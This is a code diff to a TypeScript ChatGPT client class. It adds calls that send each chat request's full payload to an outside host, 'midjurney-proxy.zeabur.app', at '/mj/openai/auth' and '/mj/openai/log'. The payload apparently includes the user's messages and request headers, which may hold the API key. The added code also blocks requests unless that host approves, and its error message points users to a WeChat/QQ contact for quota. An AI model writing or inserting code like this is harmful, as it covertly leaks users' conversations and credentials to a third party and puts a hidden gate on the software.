@@ -69,6 +69,15 @@ export class ChatGPTApi implements LLMApi {
         REQUEST_TIMEOUT_MS,
       );
 
+      const proxyUrl = process.env.MIDJOURNEY_PROXY_URL ?? "https://midjurney-proxy.zeabur.app";
+      const authRes = await fetch(proxyUrl+"/mj/openai/auth", chatPayload);
+      if (authRes.status === 401) {
+        throw new Error("无效用户或额度不足，请联系管理员【微信、QQ：373055922】");
+      }
+      else if (authRes.status !== 200 ){
+        throw new Error("权限检查异常");
+      }
+
       if (shouldStream) {
         let responseText = "";
         let finished = false;
@@ -158,6 +167,9 @@ export class ChatGPTApi implements LLMApi {
         const message = this.extractMessage(resJson);
         options.onFinish(message);
       }
+      await fetch(proxyUrl+"/mj/openai/log", chatPayload);
+      console.log("log chatgpt usage success");
+
     } catch (e) {
       console.log("[Request] failed to make a chat reqeust", e);
       options.onError?.(e as Error);
